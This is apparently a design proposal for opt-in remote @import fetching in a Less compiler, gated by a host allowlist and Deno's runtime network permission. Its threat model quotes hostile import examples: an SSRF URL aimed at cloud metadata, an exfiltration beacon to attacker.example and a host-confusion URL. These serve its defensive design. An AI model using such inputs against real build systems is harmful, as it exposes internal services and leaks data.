# Remote (network) imports behind an explicit, runtime-enforced allowlist

> **Proposed, not built.** Today `@import "https://host/x.less"` is a CSS
> terminal: the import isn't fetched, it's passed through as a literal
> `@import url(...)`. This describes an opt-in path that fetches it — and the
> policy that keeps that path safe.

Base: `1fec4d3dcba2686abc9ab34ef3055542b26e0b7f`.
Related code: `packages/core/src/plugin.ts` (the `canResolveImport → resolve →
locate → getSource` pipeline), `packages/jess-plugin-node-modules/src/index.ts`
(the existing off-filesystem resolver this mirrors).

## 0. The idea in one line

A remote import is enabled only when the caller names the exact hosts it trusts,
and on Deno that trust is enforced by the **runtime network permission**, not by
our code — so a compromised or buggy resolver still cannot reach a host the
caller didn't allow.

## 1. Why this is a policy question, not just a feature

Fetching an `@import` URL turns the compiler into an HTTP client that runs
wherever the build runs — a laptop, CI, a server rendering user-supplied Less.
The failure modes are the standard ones for "server fetches a URL":

- **SSRF**: `@import "http://169.254.169.254/latest/meta-data/..."` or
  `http://localhost:6379/` reaches cloud metadata / internal services from the
  build host.
- **Exfiltration / tracking**: `@import "https://attacker.example/beacon.less"`
  phones home with whatever is in the request (and the build's egress IP).
- **Supply-chain**: a trusted CDN host that later serves malicious content, or a
  redirect from a trusted host to an untrusted one.

So the default stays **off**, and "on" is never "fetch anything" — it is "fetch
from *these* hosts."

## 2. Default and opt-in surface

**Default (unchanged):** no network. With no remote-import plugin configured,
`canResolveImport` is absent for URL specifiers, and — per its documented
contract in `plugin.ts` — external imports remain CSS terminals. Nothing
fetches. This is the current behavior; the design must not weaken it.

**Opt-in:** the caller adds a remote-import plugin with an explicit allowlist.

```js
import less from 'less';
import { remoteImportPlugin } from '@jesscss/plugin-remote-import';

await less.render(src, {
  plugins: [remoteImportPlugin({
    allow: ['cdn.example.com', 'design-tokens.example.com'],
    // defaults: https only, no redirects across hosts, 5s timeout, 512KB cap
  })],
});
```

An empty or absent `allow` list is a hard error at construction ("remote imports
require an explicit host allowlist"), not a silent allow-all. There is no
`allow: '*'` — if someone truly wants it they can pass every host, and that
choice is visible in their config.

## 3. Where it slots into the engine

The plugin implements the existing import capabilities (`plugin.ts`), same shape
as `plugin-node-modules`:

| Capability | Behavior |
| --- | --- |
| `canResolveImport(specifier)` | `true` only for `https:` (and configured `http:`) URL specifiers whose host is on `allow`. A host **not** on the list returns `false` → the import falls through to a CSS terminal (or an error, see §6), and **no fetch is attempted**. |
| `resolve` / `expandImport` | Identity for a URL (no `.less`/`_partial` expansion); may normalize the host + drop default ports. |
| `locate` | Returns the canonical absolute URL as the source identity. |
| `getSource(url)` | The **only** method that touches the network. Performs the fetch under the constraints in §4. |

Because `canResolveImport` gates entry to the pipeline, a host off the list is
rejected *before* resolve/locate/getSource — the fetch code is never reached for
a disallowed host. That is the app-level check. §4 is what makes it real on Deno.

## 4. The enforcement boundary — Deno `--allow-net`

App-level host checks are necessary but not sufficient: a bug in our own
normalization (parsing `https://cdn.example.com@evil.example/…`, an
unnormalized IDN, a redirect we forgot to re-check) can route a fetch to a host
the caller never allowed. The runtime permission is the backstop that holds even
when our code is wrong.

- **Deno** (the runtime we already build/test the worker against): the process
  is launched with `--allow-net=cdn.example.com,design-tokens.example.com` — the
  **same** host list passed to the plugin. `fetch()` to any other host throws
  `PermissionDenied` from the runtime, before a socket opens. This is a real
  capability boundary: even if our resolver is tricked into calling
  `fetch("https://evil.example/x")`, Deno denies it. Redirects are re-checked
  per hop by Deno, so a 302 from an allowed host to a denied host is denied by
  the runtime, not just by us.
- **Node**: Node has no stable per-host network permission (the
  `--permission`/`--allow-net` model is experimental and coarse). On Node the
  allowlist is enforced **only** at the app level (§3), plus the §5 hardening. We
  document this honestly: **Node gives you the allowlist; Deno gives you the
  allowlist *and* a runtime guarantee.** The proof harness (§7) runs on Deno for
  exactly this reason.

The plugin does not *grant* itself permission — the caller (or our CLI/worker
launcher) passes `--allow-net=<hosts>` derived from the same `allow` config, so
the two can't drift: if a host is in `allow` but not in `--allow-net`, the fetch
is denied (fail-closed); the launcher asserts the two sets match.

## 5. Hardening applied to every allowed fetch

Even for an allowed host:

- **Scheme**: `https:` only unless the caller opts a host into `http:`
  explicitly.
- **No cross-host redirects**: follow redirects only while the host stays on the
  allowlist; a redirect off-list aborts (Deno also denies it at the socket).
- **SSRF belt-and-suspenders**: reject literal-IP hosts and private/link-local
  ranges (`10/8`, `172.16/12`, `192.168/16`, `127/8`, `169.254/16`, `::1`, ULA)
  unless the caller explicitly allows an IP host. The allowlist already blocks
  metadata endpoints, but an allowed host resolving to a private IP is the
  DNS-rebinding case — worth an option, default deny.
- **Size + time caps**: default 512 KB body cap and a 5s timeout, both
  configurable; refuse `Content-Length` over cap and stream-abort past it.
- **Determinism / caching**: fetched sources are cached by URL for the render
  (imports are once-only), and — open question §8 — optionally content-addressed
  to a lockfile so builds are reproducible and reviewable.

## 6. `false` vs error for a disallowed host

Two behaviors for `@import "https://not-allowed.example/x.less"`:

1. **CSS terminal** (like today's no-plugin case): emit `@import
   url("https://not-allowed.example/x.less")` and let the browser fetch it. This
   matches "we don't inline it," and is the safest silent default.
2. **Compile error**: "remote import from `not-allowed.example` is not on the
   allowlist" — surfaces the intent ("I meant to inline this") instead of
   silently shipping a runtime `@import`.

Proposed: **error when a remote-import plugin is configured** (the caller opted
into inlining, so a blocked host is a mistake worth reporting), **terminal when
no plugin is configured** (the current, network-free default). Open for owner
sign-off (§8).

## 7. The proof: a test that shows Deno *denies* an off-list host

The claim "Deno enforces the boundary" is only worth making if a test fails when
it doesn't hold. Sketch:

- Stand up two loopback HTTPS origins (self-signed) on distinct hostnames via
  `/etc/hosts`-style aliases or a stub resolver: `allowed.test` and
  `denied.test`, each serving a trivial `.less` file.
- Spawn a Deno subprocess running the compiler with
  `--allow-net=allowed.test` and the plugin configured with `allow:
  ['allowed.test']`.
- **Assert PASS:** `@import "https://allowed.test/a.less"` inlines and renders.
- **Assert DENY (the important one):** `@import "https://denied.test/b.less"`
  fails with a **`PermissionDenied`** raised by the Deno runtime — verified by
  the error identity, not by our app-level message. If our app check is disabled
  in the test build, the render must **still** fail, because the runtime denied
  it. That is the difference between "we checked" and "it cannot happen."
- **Assert cross-host redirect deny:** `allowed.test` responds `302` to
  `https://denied.test/…`; the render fails at the redirect hop.

A companion Node test covers the app-level allow/deny path (no runtime
guarantee), so both runtimes have coverage and the Node limitation is explicit
in the suite, not just prose.

## 8. Open questions for the owner

1. **Terminal vs error** for a disallowed host when the plugin is configured
   (§6) — proposed: error. Confirm.
2. **IP / private-range hosts**: default-deny with an explicit opt-in (§5), or
   out of scope for v1?
3. **Reproducibility**: ship a lockfile / SRI-style integrity for remote imports
   in v1, or defer? (Argues for content-addressed caching if yes.)
4. **CLI**: does `lessc` expose `--allow-net`/`--remote-import-host` in v1, or is
   remote import API-only until the policy settles?
5. **`@use`/`@compose` over the network**: same allowlist, or does module import
   get its own policy? (Cross-links the `@use`/`@compose` thread.)

## 9. Scope for a first cut

Smallest thing that is safe and provable:

- `@jesscss/plugin-remote-import` implementing the four capabilities (§3),
  `https:` only, explicit `allow`, no redirects, size/time caps.
- The Deno deny-proof test (§7) + the Node app-level test.
- Default stays off; no CLI surface yet (§8.4).

Everything else (IP policy nuance, lockfile/SRI, CLI flags, `@use` over the
network) is a follow-up once the boundary and its proof are in.
